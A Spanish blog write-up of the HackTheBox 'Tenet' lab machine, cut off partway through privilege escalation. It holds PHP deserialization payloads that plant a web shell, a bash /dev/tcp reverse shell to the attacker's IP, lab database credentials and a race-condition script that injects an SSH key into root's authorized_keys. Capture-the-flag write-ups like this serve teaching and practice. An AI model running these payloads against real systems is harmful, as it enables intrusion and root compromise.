---
layout      : post 
title       : "HackTheBox - Tenet"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309banner.png
category    : [ htb ]
tags        : [ wordpress, deserialization, ssh-keys, code-analysis, race-condition ]
---
Máquina **Linux** nivel medio. Exploraremos deserialización insegura de objetos en **PHP**, reutilización de contraseñas y encontraremos pequeños fallos en scripts de **bash** :P

![309tenetHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309tenetHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [egotisticalSW](https://www.hackthebox.eu/profile/94858).

Bueno bueno bu e nooo ooo ¿Cómo estás? 

Nos encontraremos con una página web montada sobre `wordpress`, daremos algunas vueltas y despues de estar perdidos (como raro :P) encontramos dos archivos interesantes: `sator.php` y `sator.php.bak`. Nos aprovecharemos que podemos ver el código fuente para entender que podemos explotar una vulnerabilidad llamada **inyección de objetos PHP**. La usaremos para conseguir una sesión como `www-data`.

* [Script para ejecutar cualquier comando en la máquina mediante la deserialización insegura](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/tenet/RCE_deserialization.py).

Enumerando tendremos unas credenciales del usuario `neil` hacia la base de datos `mysql`, con las mismas credenciales lograremos obtener una sesión como el usuario `neil`.

También enumerando (en la anterior también nos percatábamos de esto) encontramos un script que puede ser ejecutado como usuario administrador. Observando su fuente notaremos que podemos manipular el proceso, incluiremos nuestra llave pública al archivo `authorized_keys` del usuario `root`. Con esto conseguiremos una sesión como el usuario `root`.

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Tendremos que movernos bastante, lo cual está perfecto :) Pero la máquina es muy poco realista :(

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto).

...

¿Qué haremos?

1. [Enumeración](#enumeracion)
2. [Explotación](#explotacion)
3. [Escalada de privilegios](#escalada-de-privilegios)

...

## Enumeración [#](#enumeracion) {#enumeracion}

Realizaremos un escaneo de puertos para saber que servicios está corriendo la máquina.

```bash
–» nmap -p- --open -v 10.10.10.223 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                                                                                  |
| --open     | Solo los puertos que están abiertos                                                                      |
| -v         | Permite ver en consola lo que va encontrando                                                             |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard      |

```bash
–» cat initScan 
# Nmap 7.80 scan initiated Sun Jan 17 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.223
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.223 ()   Status: Up
Host: 10.10.10.223 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Sun Jan 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 86.68 seconds
```

Perfecto, tenemos:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)**: Conexión remota segura mediante una Shell |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto)**: Protocolo que permite la comunicación y transferencia de info a través de la web   |

Hagamos nuestro escaneo de scripts y versiones con base en cada puerto, con ello obtenemos información más detallada de cada servicio:

```bash
–» nmap -p 22,80 -sC -sV 10.10.10.223 -oN portScan
```

| Parámetro | Descripción |
| ----------|:----------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
–» cat portScan 
# Nmap 7.80 scan initiated Sun Jan 17 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.223
Nmap scan report for 10.10.10.223
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 14.20 seconds
```

Obtenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :-------|
| 22     | SSH      | OpenSSH 7.6p1 Ubuntu 4 |
| 80     | HTTP     | Apache httpd 2.4.29    |

Pues démosle a cada servicio y veamos que podemos romper (:

...

En cuanto al puerto **22** y su versión `OpenSSH 7.6`, lo único que podemos hacer es enumeración de usuarios en concreto, pero por el momento no tenemos ninguno, así que sigamos...

### Puerto 80 [⌖](#puerto-80) {#puerto-80}

![309page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80.png)

Nos muestra la página por defecto de Apache... Usémosla para hacer algo de fuzzing, en este caso antes de usar `dirsearch` o `wfuzz`, emplearé un script de `nmap` que nos dará una visión rápida por si hay algo interesante:

```bash
–» nmap -p 80 --script http-enum 10.10.10.223 -oN webScan
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-17 25:25 -25
Nmap scan report for 10.10.10.223
Host is up (0.19s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /wordpress/wp-login.php: Wordpress login page.

Nmap done: 1 IP address (1 host up) scanned in 19.79 seconds
```

Opa, tenemos una ruta, veamos su contenido:

![309page80_wplogin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_wplogin.png)

Algo feito... Lo interesante es que nos permite ir de vuelta a `tenet`, que si revisamos hacía que URL nos lleva:

```html
...
<p id="backtoblog"><a href="http://tenet.htb/">
&larr; Go to Tenet</a></p>
...
```

Agreguémosla al archivo `/etc/hosts` y validemos `http://tenet.htb`.

```bash
–» cat /etc/hosts
...
10.10.10.223  tenet.htb
...
```

![309page80_tenetHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_tenetHTB.png)

Tenemos 3 artículos, uno sobre la búsqueda de nuevos talentos :P, otro sobre una migración de información que están haciendo y otro sobre un nuevo release, revisando cada uno, el de la migración tiene algo interesante:

![309page80_tenetHTB_migration](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_tenetHTB_migration.png)

![309page80_tenetHTB_mig_comment](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_tenetHTB_mig_comment.png)

Habla sobre un ***sator php file***, una búsqueda rápida me direcciono:

![309google_satorPHPfile](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309google_satorPHPfile.png)

Hay dos señales de que por acá debe ser el camino, `Tenet` está grabado en los cuadros y el logo de la máquina es el mismo que el cuadro, así que sí, debe ser por acá... Muy real no es pero está divertido :P

> **Cuadrado Sator**: Cuadrado mágico compuesto por cinco palabras latinas: SATOR, AREPO, TENET, OPERA, ROTAS, que, consideradas en conjunto, dan lugar a un multipalíndromo (Frases que se leen igual desde el lado izquierdo al derecho que en sentido contrario). [Wikipedia](https://es.wikipedia.org/wiki/Cuadrado_sator)... **Me parecio interesante**, sigamos.

...

Así que entiendo que debemos encontrar el archivo `sator.php` (?), o quizás su backup `sator.php.bak` (?). Estoy adivinando a que puedan ser esos nombres, pero no lo podemos saber hasta encontrarlos, no?

**Llevo bastante rato perdido, no encuentro nadaaaaaaaaaaaaaa.** (Si, hablando en presente :P)

Tuve que pedir ayuda al que nunca falla, [@TazWake](https://www.hackthebox.eu/profile/49335) y ay noooo, era lo más sencillo del mundo, pero pues estaba tan cerrado en encontrarlo que no lo pensé. 

Si revisamos la IP del dominio `tenet.htb`, o sea la `10.10.10.223` y buscamos ahí los archivos... Pues si, sencillamente los encontramos 😀 🙃 😐 😔

![309page80_satorPHP](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_satorPHP.png)

Y si apuntamos al backup (`sator.php.bak`), nos permite descargar el archivo...

```php
<?php

class DatabaseExport
{
  public $user_file = 'users.txt';
  public $data = '';

  public function update_db()
  {
    echo '[+] Grabbing users from text file <br>';
    $this-> data = 'Success';
  }

  public function __destruct()
  {
    file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
    echo '[] Database updated <br>';
    echo 'Gotta get this working properly...';
  }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();

?>
```

Algo que me llamo la atención de inmediato fue la función `unserialize`, puesto que he experimentado con vulnerabilidades al serializar o deserializar un objeto. Así que despues de buscar por internet de que se trataba y si era peligroso su uso, tenemos varias cositas interesantes:

...

## Explotación [#](#explotacion) {#explotacion}

**Se viene mucho texto :)**

...

* **Excelente articulo:** Exploiting PHP deserialization - [medium.com/(vickie li)](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a).

...

### Explicando concepto de deserialización

En pocas palabras (pocas realmente, échenle un ojo por su parte, es super interesante). La [deserialización](https://www.glosarioit.com/Deserializaci%C3%B3n) es pasar un conjunto de bytes que viaja por la red a un único objeto. (La serialización sería lo contrario). 

El problema de esto es que mientras se efectúa la conversión/transformación, siempre depende de la sanitización con la que se cuente, se pueden inyectar comandos que si o si, se ejecutarán en el proceso, donde si llegase a fallar por X o Y motivo, no nos importaría, ya que el intento de serialización/deserialización se hizo, por lo tanto también nuestro exploit.

Algo más de info:

* Deserialización insegura - [seguridad-ofensiva.com/OWASP-Top-10](https://seguridad-ofensiva.com/blog/owasp-top-10/owasp-top-8/).
* PHP Object Injection Cheat Sheet - [nitesculucian.github.io](https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/).
* Insecure Deserialization PHP - [github.com/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md).
* PHP object injection - [tarlogin.com](https://www.tarlogic.com/blog/php-object-injection/).

En nuestro caso tratamos con una deserialización en PHP, enfoquémonos en el código del archivo `sator.php`:

<span style="color: yellow;">1. </span>Recibe las peticiones `GET` mediante el argumento `arepo` y lo guarda en la variable `input` para posteriormente hacer la respectiva `deserializacion` de ella (viene lo lindo).

<span style="color: yellow;">2. </span>Guarda la deserialización en otra variable y no hace nada con ella. Ahora genera un nuevo objeto para simplemente imprimir `[+] Grabbing users from text file` en la web. (Lo vimos en la imagen anterior)

<span style="color: yellow;">3. </span>Lo <<lindo>> es que en todos los artículos que hablan sobre `PHP serialize/unserialize object injection` tocan dos ítems necesarios para poder aprovecharnos del proceso:
* Acá tocan que obviamente tengamos la manera de manipular la data que se va a deserializar. En nuestro caso tenemos el argumento `arepo`, así que bien.
* El uso de un [método mágico](https://www.php.net/manual/en/language.oop5.magic.php) (Básicamente métodos para llevar a cabo ciertas tareas, [mucha más info acá](https://www.tutorialspoint.com/php-magic-methods)).
  * Nosotros tenemos el método `__destruct()` que borra cualquier referencia en base al objeto creado.
* Donde siempre que se llame a la función `unserialize` se llamara también al método. (Por eso también veíamos en la imagen el texto `[] Database updated`, no sé por qué el otro texto no se muestra, pero bueno, se entiendo el punto.

<span style="color: yellow;">4. </span>Finalmente toma el contenido de la variable `user_file` (en este caso `users.txt`) y le guarda el contenido ahora de la variable `data` (en este caso `''` (vacío por si no se entiende :P)). Todo mediante la función [file_put_contents](https://www.php.net/manual/es/function.file-put-contents.php).

Eso es lo que hace el archivo, pero ¿cómo podemos finalmente aprovecharnos de esto? Bueno despues de algo de prueba y error y de encontrar este artículo, realmente entendí la explotación:

Pero antes, una aclaración :P el articulo simplemente me ayudo a obtener un output (que ni supuse me iba a dar) con el que estaba lidiando en mi cabeza antes de encontrarlo:

* PHP unserialize object injection .. wordpress - [dannewitz.ninja](https://dannewitz.ninja/posts/php-unserialize-object-injection-yet-another-stars-rating-wordpress)

El articulo cita este trozo de codigo, el cual me parecio interesante:

> ```php
> $logger = new Logger('exploit.php', '<?php exec($_GET["paul"]) ?>');
> echo htmlspecialchars(urlencode(serialize($logger)));
> ```

Que planeaba usar para que me generara un archivo (exploit.php) obteniendo el objeto **serializado** para enviarlo mediante una petición `GET`. Asi que lo agregue al objeto `sator.php.bak` y lo ejecute:

```php
...
$app -> update_db();

echo "------";
$logger = new DatabaseExport('expl.php', '<?php exec($_GET["paul"]) ?>');
echo htmlspecialchars(urlencode(serialize($logger)));
echo "------";

?>
```

```bash
–» php sator.php.bak
[+] Grabbing users from text file <br>------O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22users.txt%22%3Bs%3A4%3A%22data%22%3Bs%3A0%3A%22%22%3B%7D------[] Database updated <br>Gotta get this working properly...[] Database updated <br>Gotta get this working properly...
```

Nos genera la cadena en formato URL encode. Hagamos un **Decode**:

```json
O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"users.txt";s:4:"data";s:0:"";}
```

Asi es como viaja la data del objeto serializado, hay mas items pero en la cadena que tenemos nosotros contamos con: (Vuelvo a citar el gran [articulo de Vickie Li](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a)).

| Argumento | Descripción |
| :-------- | :---------- |
| O         | Representa un `objeto` llamado `DatabaseExport` (la longitud de la cadena es `14`) y que tiene `2` propiedades, la primera propiedad: |
| s         | Representa una `string` de `9` caracteres llamada `user_file` |
| s         | Representa una `string` de `9` caracteres llamada `users.txt` y la segunda propiedad: |
| s         | Representa una `string` de `4` caracteres llamada `data` |
| s         | Representa una `string` de `0` caracteres llamada `` |

Perfecto, esto de una me hizo pensar en el archivo `users.txt` y que probablemente este creado en la raiz de la web, conteniendo `Success` (como nos lo indica el codigo de `sator.php.bak`).

![309page80_usersTXT](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_usersTXT.png)

Opa, jmmm interesante. Despues de pensar y probar algunas cosas me llego una idea... Yo no podria modificar el contenido del archivo `users.txt`? Pues probemos, para esto usé `BurpSuite`:

```json
/sator.php?arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"users.txt";s:4:"data";s:6:"holaa?";}
```

![309burp_tryingDATAchange](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309burp_tryingDATAchange.png)

Damos `Send` y ahora revisamos el archivo `users.txt`:

![309page80_usersTXTupdated](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_usersTXTupdated.png)

Nice, nice, niceeeeeeeeeeeeeeeeeeee. Pero con un archivo `.txt`, que podemos explotar... Jmmmm, entonces también pensé en si se podría crear un archivo que no fuera `users.txt` (?) Veámoslo:

```json
/sator.php?arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:16:"ajaTEncontre.php";s:4:"data";s:23:"<?php echo 'holaa?'; ?>";}
```

Encode URL:

```json
/sator.php?arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:16:"ajaTEncontre.php";s:4:"data";s:23:"%3C%3Fphp%20echo%20%27holaa%3F%27%3B%20%3F%3E";}
```

![309page80_ajaTE_hola](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_ajaTE_hola.png)

Bingo PAAAAAAAAAAAA, ahora probemos a insertar algo que nos permita ejecutar comandos en el sistema:

```json
/sator.php?arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:16:"ajaTEncontre.php";s:4:"data";s:58:"<?php $command=shell_exec($_GET['xmd']); echo $command; ?>";}
```
Encode URL:

```json
/sator.php?arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:16:"ajaTEncontre.php";s:4:"data";s:58:"%3C%3Fphp%20%24command%3Dshell_exec%28%24_GET%5B%27xmd%27%5D%29%3B%20echo%20%24command%3B%20%3F%3E";}
```

Comprobemos:

![309page80_ajaTE_getEXEC](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_ajaTE_getEXEC.png)

Listos, tenemos ejecución remota de comandos en el sistema. Intentemos entablar una reverse Shell, primero nos ponemos en escucha:

```bash
–» nc -lvp 4433
listening on [any] 4433 ...
```

Ahora hacemos la petición:

```html
/ajaTEncontre.php?xml=bash -c "bash -i >& /dev/tcp/10.10.14.226/4433 0>&1"
```

URL Encode:

```html
/ajaTEncontre.php?xml=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.226%2F4433%200%3E%261%22
```

Yyy obtenemos nuestra Shell:

![309page80_ajaTE_revSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309page80_ajaTE_revSH.png)

PERFECTOOOOOOOOOOO, que vaina linda ehh!! ⛷️

...

* [Script para ejecutar cualquier comando en la máquina mediante la deserialización insegura](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/tenet/RCE_deserialization.py).

...

Bueno, hagamos tratamiento de la TTY y sigamos...

* S4vitar nos explica lo que debemos hacer para conseguir una [Shell completamente interactiva (tratamiento de la TTY)](https://www.youtube.com/watch?v=GVjNI-cPG6M&t=1689).

...

Tenemos solo un usuario y es el que contiene la bandera del `user.txt`:

```bash
www-data@tenet:/var/www/html$ ls /home/
neil
www-data@tenet:/var/www/html$ ls /home/neil/
user.txt
www-data@tenet:/var/www/html$ cat /home/neil/user.txt 
cat: /home/neil/user.txt: Permission denied
www-data@tenet:/var/www/html$
```

Enumerando con `linpeas.sh` vemos unas credenciales del usuario `neil` hacia una base de datos y que `www-data` puede ejecutar ese archivo como usuario `root`:

```php
...
[+] Searching Wordpress wp-config.php files
wp-config.php files found:
/var/www/html/wordpress/wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'neil' );
define( 'DB_PASSWORD', 'Opera2112' );
define( 'DB_HOST', 'localhost' );
...
...
...
User www-data may run the following commands on tenet:·
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
...
```

Si validamos que servicios está corriendo localmente vemos la base de datos:

```bash
www-data@tenet:/dev/shm$ netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
tcp        0      0 localhost.localdo:mysql 0.0.0.0:*               LISTEN
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN
tcp6       0      0 [::]:http               [::]:*                  LISTEN
udp        0      0 localhost:domain        0.0.0.0:*
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     SEQPACKET  LISTENING     14311    /run/udev/control
...
```

* mysql -> `neil`:`Opera2112`.

Entonces probemos:

```bash
www-data@tenet:/dev/shm$ mysql -u neil -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 7
Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

Perfe, pues enumeremos la base de datos:

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
5 rows in set (0.00 sec)

mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> 
```

Veamos la tabla `wp_users`:

```bash
mysql> SELECT * FROM wp_users;
+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login  | user_pass                          | user_nicename | user_email            | user_url                     | user_registered     | user_activation_key | user_status | display_name |
+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+
|  1 | protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. | protagonist   | protagonist@tenet.htb | http://10.10.10.44/wordpress | 2020-12-16 12:17:10 |                     |           0 | protagonist  |
|  2 | neil        | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. | neil          | neil@tenet.htb        | http://tenet.htb             | 2020-12-16 14:51:26 |                     |           0 | neil neil    |
+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+
2 rows in set (0.00 sec)

mysql> 
```

Tenemos dos hashes, para validar que tipo son, nos apoyamos de [los ejemplos que tiene `hashcat`](https://hashcat.net/wiki/doku.php?id=example_hashes).

![309google_hashcat_examples](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309google_hashcat_examples.png)

Los hashes son tipo `phpass, WordPress (MD5), Joomla (MD5)`. Veamos si los podemos crackear con `rockyou.txt`:

**PEEEEEEEEEEEERO ANTES**, intentemos ingresar con la cuenta `neil` y la contraseña `Opera2112` a su sesión en la máquina, por probar, antes de quemar nuestra RAM (:

```bash
www-data@tenet:/var/www/html$ su neil
Password: 
neil@tenet:/var/www/html$ cd 
neil@tenet:~$ id
uid=1001(neil) gid=1001(neil) groups=1001(neil)
neil@tenet:~$ 
```

Pues si, para evitar quemarnos la cabeza con otros temas :P (Ya me ha pasado en varias máquinas).

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Acá entra en juego el archivo que encontramos mediante `linpeas.sh`:

```bash
neil@tenet:~$ sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
neil@tenet:~$ 
```

Podemos ejecutar el script como usuario administrador del sistema empleando `sudo`, solo que ahora con `neil`. Veamos su contenido:

```bash
#!/bin/bash

checkAdded() {
        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
                /bin/echo "Successfully added $sshName to authorized_keys file!"
        else
                /bin/echo "Error in adding $sshName to authorized_keys file!"
        fi
}

checkFile() {
        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi

                exit 1
        fi
}

addKey() {
        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
        (umask 110; touch $tmpName)
        /bin/echo $key >>$tmpName
        checkFile $tmpName
        /bin/cat $tmpName >>/root/.ssh/authorized_keys
        /bin/rm $tmpName
}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"

addKey
checkAdded
```

Bien, tenemos:

1. Crea un archivo en `/tmp` con nombre `ssh-*` (el `*` significa que puede ser cualquier nombre),
2. despues almacena el valor de la variable `$key` (que en este caso tiene la llave pública del usuario root de la máquina) en ese archivo temporal,
3. verifica que el archivo se haya creado y tenga contenido, si hay error lo borra. (Mira [estos recursos](https://linuxize.com/post/bash-if-else-statement/) sobre [declaraciones en IF bash](https://ryanstutorials.net/bash-scripting-tutorial/bash-if-statements.php#if)).
4. Ahora toma el contenido del archivo y lo agrega al objeto `/root/.ssh/authorized_keys`; esto con el fin de no tener que ingresar contraseña en el caso del usuario `root@ubuntu` con esa llave pública y la llave privada relacionada. (Más [info acá](https://www.ssh.com/ssh/authorized_keys/) y [también acá](https://www.uv.es/~sto/articulos/BEI-2003-01/ssh_np.html) sobre el archivo **/.ssh/authorized_keys**.)
5. Borra el archivo temporal y válida que efectivamente se haya agregado la llave.

Listos, ya que sabemos que hace el script y porque lo hace, podemos aprovecharnos de esto de una manera muy sencilla.

Sabemos que se crean archivos temporales cada vez que ejecutamos el script, pero que a la vez se borran superrápido. Entonces podemos armarnos otro script en el que le pasemos **nuestra llave publica** a cualquier archivo que esté creado sobre la carpeta `/tmp` y que empiece con el nombre `ssh-`. Esto para poder simplemente ingresar a la máquina sin necesitar contraseña. Ya que le estamos diciendo que nos guarde nuestra identidad **pública** en su máquina y como en este caso lo guarda en la ruta del usuario administrador, podríamos ingresar como `root`.

* SSH Keys - [archlinux.org](https://wiki.archlinux.org/index.php/SSH_keys_(Espa%C3%B1ol))

Primero veamos como generar nuestras llaves:

```bash
–» ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /.ssh/id_rsa
Your public key has been saved in /.ssh/id_rsa.pub
The key fingerprint is:
SHA256:LWUMikKpuLYON5XF4vAcInU0kG4YR72yxCWpuLs9urg lanz@lanz
The key's randomart image is:
+---[RSA 3072]----+
| .*B*   .        |
| o+= * . o       |
|+oB * =   +      |
|=+ @ *   +       |
|.o. O   S .      |
|o. o     .       |
|o.+              |
|++..             |
|E*..             |
+----[SHA256]-----+
· ~/.ssh ·
–» ls
id_rsa  id_rsa.pub
```

Perfecto, nos genera las 2 llaves, una **pública** y otra **privada**.

> Las llaves de SSH siempre son generadas en pares con una llamada llave privada y otra llamada llave pública. La llave privada solo es conocida por el usuario y debe ser guardada con cuidado. En contraste, la llave pública puede ser compartida libremente con cualquier servidor SSH con el que se quiere conectar. [ArchLinux.org](https://wiki.archlinux.org/index.php/SSH_keys_(Espa%C3%B1ol)#Informacion_preliminar)

Nosotros necesitaremos la llave pública, porque como cité anteriormente: "la llave pública puede ser compartida libremente con cualquier servidor SSH con el que se quiere conectar"

![309bash_idrsaPUB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309bash_idrsaPUB.png)

Ahora creemos el script, lo llamaré `rounded.sh`:

```bash
#!/bin/bash

keyy="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCo9T2TnGWh+/2D876RYO1Wd08WkOJGFSL1oSu/loc0Khb0U/Ou8gwj8+NyFq0E5SuPIWHDtogg00/KOrzmFLwMza+oN5HumhHBeNgJvF4IxU3LmHciLWjHpCDXQvJf1FmazIVGuvXlNEuuEHV2TBO2R8H+2jO4GHVHB57dFci87StQoPU9V8fs0NXnieCkOvFH3gESWlbeDj8h0O7mYpjvdGNFgbvlpvKe3zhxrB9al5CPYFcMy4Zv0TXT+tRYjU1jKUJX8WaxNzDDdKhnp68N5BuDMlxkyNdRSlQUQIJcfglRdubLOre4r7SYpNBhWUI6IowMHvDXcw7+zGmtqAUqTjsm0whlRrNxGlsEHdLUA/EPu+wlcVlk9f9uGugTE7LTJxbYXPe96xc+xVL3T3Ciq6fz/aj0cBkIpwKsGLCyFKOceWrtrSu+f7KZCBODXMiKfxNF6wMZusDzN8VMWc6NY1SF0WE3UPcG+PNsBfQuIagiLXi40/lVOZoH7A7U1Xk= lanz@lanz"

while true
do
  echo $keyy | tee /tmp/ssh-*
done
```

Con `tee` le indicamos que reemplace el contenido del archivo `/tmp/ssh-LOQUESEA` con lo que le pasemos, en este caso nuestra llave. Cuando lo haga nos mostrara el output. Así que en vez de guardar la del usuario `root@ubuntu` guardaría la de `lanz@lanz`. Veamos un ejemplo sencillo:

```bash
–» cat pub_test 
ssh-rsa sssssssssssssssssssssssssdddddddddddddddddddddddddddddddddddd= jorge@root

–» echo "ssh-rsa ESTAESAHORALAllavePUBLICAqueVAM0S4AGREGARr= jorge?@sijorge" | tee pub_test 
ssh-rsa ESTAESAHORALAllavePUBLICAqueVAM0S4AGREGARr= jorge?@sijorge

–» cat pub_test 
ssh-rsa ESTAESAHORALAllavePUBLICAqueVAM0S4AGREGARr= jorge?@sijorge
```

Listo, pues démosle, subamos el script a la máquina:

```bash
–» python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
neil@tenet:/dev/shm$ wget http://10.10.14.226:8000/rounded.sh
neil@tenet:/dev/shm$ chmod +x rounded.sh 
neil@tenet:/dev/shm$ ls -la
total 4
drwxrwxrwt  2 root root   60 Jan 19 18:07 .
drwxr-xr-x 17 root root 3780 Jan 19 14:51 ..
